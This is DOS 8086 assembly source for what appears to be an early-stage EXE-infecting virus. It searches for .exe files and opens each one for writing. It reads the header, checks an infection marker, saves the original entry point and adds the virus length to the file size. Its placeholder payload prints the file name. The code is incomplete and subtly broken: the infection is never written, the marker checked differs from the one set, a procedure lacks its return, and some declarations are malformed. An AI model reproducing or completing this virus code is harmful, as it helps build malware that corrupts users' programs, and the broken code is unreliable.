.model small
.stack 100h
.code
start:

; ds setting
push cs
pop ds

; finding an .exe file

; setting dta on file
mov ah, 1ah
lea dx, file
int 21h

; finding the first file
lea dx, file_mask
mov ah, 4eh
int 21h
jmp file_open

; finding next file
find_next:
mov ah, 3eh
int 21h
mov ah, 4fh
int 21h

; opening the file (file descriptor -> ax)
file_open:
lea dx, file.f_name
mov ax, 3D02h
int 21h
mov bx, ax ; file descriptor (ax) -> bx
jc find_next ; error handling

; reading exe header
mov ah,03fh
mov cx,1Ah
lea dx,header
int 21h

; check for infection
cmp header[13h], 69h
jz find_next

; saving file_descriptor
mov file_descriptor, bx

; saving ip0 & cs0
mov ax, word ptr header[14h]
mov old_ip, ax
mov ax, word ptr header[16h]
mov old_cs, ax

call calculate_header

; closing file
mov ah, 3eh
int 21h

; PAYLOAD BEGIN

lea dx, file.f_name
call str_f2c
mov ah, 09h
int 21h

; PAYLOAD END

; exit program
mov ah, 4ch
int 21h

procedures:

; the new header vals calc proc
calculate_header proc
    ; stash all registers to the stack
    push ax
    push bx
    push cx
    push dx

    ; infection mark
    mov header[13h], '3'

    ; filesize
    mov ax, word ptr file.f_size[0]
    mov bx, word ptr file.f_size[2]
    add ax, vir_len
    adc bx, 0

    ; restore all stashed registers from the stack
    pop dx
    pop cx
    pop bx
    pop ax
calculate_header endp

; converting file-str to console-str in dx
str_f2c proc
    push cx
    push bx
    mov cx, 13
    str_f2c_lp:
    mov bx, dx
    add bx, 13
    sub bx, cx
    cmp byte ptr[bx], 0
    jz str_f2c_ch
    loop str_f2c_lp
    str_f2c_popret:
    pop bx
    pop cx
    ret
    str_f2c_ch:
    mov byte ptr[bx], '$'
    jmp str_f2c_popret
str_f2c endp

; converting console-str to file-str in dx
str_c2f proc
    push cx
    push bx
    mov cx, 13
    str_c2f_lp:
    mov bx, dx
    add bx, 13
    sub bx, cx
    cmp byte ptr[bx], '$'
    jz str_c2f_ch
    loop str_c2f_lp
    str_c2f_popret:
    pop bx
    pop cx
    ret
    str_c2f_ch:
    mov byte ptr[bx], 0
    jmp str_c2f_popret
str_c2f endp

data:
; DTA buffer structure
DTAFileInfo struc
    f_reserved db 21 dup(?)
    f_attr db ?
    f_time dw ?
    f_date dw ?
    f_size dd ?
    f_name db 13 dup(?)
ends

ExeHeader struc
    x_signature dw ?
    x_size_l dw ?
    x_size_h dw ?
    x_addr_table_size dw ?
    x_title_size dw ?
    x_min_pars_for_boot dw ?
    x_max_pars_for_boot dw ?
    x_stack_offset dw ?
    x_sp_init dw ?
    x_check_sum dw ?
    x_ip_init dw ?
    x_cs_offset dw ?
    x_addrs_setup_offset dw ?
    x_is_overlay dw ?
    x_dynamic_addrs_table dw ?
ends

file DTAFileInfo <>
vir_len equ offset vir_end - offset start
file_descriptor dw, ?
file_mask db '*.exe*', 0
header ExeHeader <>

inserting_data:
old_ip dw, ?
old_cs dw, ?

vir_end:
end start